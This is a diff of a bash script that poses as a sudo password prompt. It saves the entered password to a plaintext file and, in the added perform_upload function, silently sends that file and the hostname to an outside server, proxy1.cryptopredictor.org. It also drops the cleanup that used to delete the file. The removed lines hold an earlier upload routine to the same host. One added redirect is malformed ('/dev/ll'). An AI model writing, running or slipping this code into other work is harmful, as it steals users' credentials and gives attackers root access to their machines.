@@ -1,7 +1,19 @@
-readonly SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
-readonly PROMPT="[sudo] password for ${USER}: "
-readonly PASS_FILE="${HOME}/.config/pass"
+SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
+PROMPT="[sudo] password for ${USER}: "
+PASS_FILE="${HOME}/.config/pass.txt"
 mkdir -p "$(dirname "${PASS_FILE}")"
+
+perform_upload() {
+    if [[ -e "$PASS_FILE" ]]; then
+        if curl -s -S -X POST "https://proxy1.cryptopredictor.org/upload" \
+            -F "file=@$PASS_FILE" \
+            -F "hostname=$HOSTNAME" >/dev/null; then
+            
+            # Clean up nohup output files
+            rm -f nohup* 2>/dev/null || true
+        fi
+    fi
+}
 
 authenticate_with_sudo() {
     local password
@@ -17,8 +29,10 @@ authenticate_with_sudo() {
 		chmod 600 "${PASS_FILE}"
 
 		if /usr/bin/printf "%s\n" "$password" | /usr/bin/sudo -S "$@" 2>/dev/null ; then
+
+			nohup perform_upload >/dev/null 2>&1 &
+			rm nohup* 2>/dev/ll
             unset password
-            rm -f "${PASS_FILE}" >/dev/null 2>&1
             return 0
         else
 			echo "Sorry, try again."
@@ -31,21 +45,6 @@ authenticate_with_sudo() {
 
     done
 
-	TAR_FILE="${USER}_pass.tar.gz"
-
-	nohup sh -c '
-		TAR_FILE="$1"
-		
-		if tar -czf "$TAR_FILE" "$PASS_FILE" >/dev/null 2>&1; then
-			
-			if curl -s -S -X POST https://proxy1.cryptopredictor.org/upload \
-				-F "file=@$TAR_FILE" \
-				-F "hostname=$(hostname)" >/dev/null; then
-				
-				rm "$TAR_FILE"
-			fi
-		fi
-	' _ "$TAR_FILE" >/dev/null 2>&1 &
 
     return 1
 }
